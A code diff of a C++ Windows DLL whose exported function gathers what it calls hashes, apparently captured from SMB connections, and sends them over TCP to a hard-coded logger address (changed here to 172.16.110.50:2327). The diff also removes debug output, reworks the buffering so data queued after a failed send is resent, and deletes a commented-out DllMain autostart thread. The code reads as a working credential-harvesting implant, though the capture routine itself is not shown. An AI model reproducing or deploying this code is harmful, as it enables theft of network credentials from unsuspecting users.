@@ -12,20 +12,21 @@
 #include "tcpclient.h"
 #include "stdafx.h"
 
-//__declspec(dllexport) DWORD WINAPI runfunc(LPVOID lpParam)
-EXTERN_DLL_EXPORT void VoidFunc()
+/* Make function exportable.  Required name is voidfunc*/
+EXTERN_DLL_EXPORT VOID VoidFunc(LPVOID lpParam)
 {
 
 	std::string hashlist;
-	std::string buff_string;
 	std::string output;
+	std::string output_buffer;
 	std::vector<std::string> hashlog;
 	char *loggerIp;
 	int loggerPort;
+	bool conn;
 
 	/*CONFIG_START */
-	loggerIp = "1.1.1.1";
-	loggerPort = 6667;
+	loggerIp = "172.16.110.50";
+	loggerPort = 2327;
 	/*CONFIG_END*/
 
 	char *pLoggerIp = loggerIp;
@@ -45,22 +46,17 @@ EXTERN_DLL_EXPORT void VoidFunc()
 			if (hashcheck)
 			{
 				output.clear();
-				cout << "[+] Buff Str size: " << buff_string.size() << endl;
-				cout << "[+] Hashlog size: " << hashlog.size() << endl;
-				cout << "[+] Output hash: " << outputHash << endl;
 				std::this_thread::sleep_for(2s);
 			}
 			else
 			{
 				hashlog.push_back(outputHash);
-				buff_string.append(output);
-			}
+				/* Buffer the output in case connection fails. */
+				output_buffer.append(output);
 
-			if (sendFail == 1 || hashcheck == false)
-			{
-				bool conn;
+				/* Send the output. */
 				conn = (ConnectToHost(loggerPort, loggerIp));
-				//Set up connection
+
 				if (conn == false)
 				{
 					sendFail = 1;
@@ -69,32 +65,25 @@ EXTERN_DLL_EXPORT void VoidFunc()
 
 				else
 				{
-					//Check for a previous failed send attempt
+					/* Check for a previous failed send attempt. */
 					switch (sendFail)
 					{
 					case 0:
-						cout << "[*] New SMB connection found.  Sending..." << endl;	//DEBUG
+						/* No Previous fails. Send just the current output. */
 						res = sendData(output);
-						//If no previous failed send attempt, only send the last caught output
-						cout << "[+] Sent output." << endl;	//DEBUG
-						buff_string.clear();
-						output.clear();
 						break;
-
 					case 1:
-
-						//There was a previous failed attempt so send queued output
-						cout << "[*] Attempting to send buffer..." << endl;	//DEBUG
-						res = sendData(buff_string);
-						cout << buff_string << endl;
-
-						if (res == 0)
-						{
-							sendFail = 0;
-							buff_string.clear();
-						}
+						/* Previous fail occurred. Send whole buffer. */
+						res = sendData(output_buffer);
 						break;
 					}
+
+					if (res == 0)
+					{
+						sendFail = 0;
+						output_buffer.clear();
+					}
+					output.clear();
 					std::this_thread::sleep_for(2s);
 				}
 
@@ -103,14 +92,6 @@ EXTERN_DLL_EXPORT void VoidFunc()
 			}
 		}
 	}
-	//return 0;
+
 }
 
-//BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwAttached, LPVOID lpvReserved)
-//{
-//	if (dwAttached == DLL_PROCESS_ATTACH)
-//	{
-//		CreateThread(NULL, 0, &VoidFunc, NULL, 0, NULL);
-//	}
-//	return TRUE;
-//}
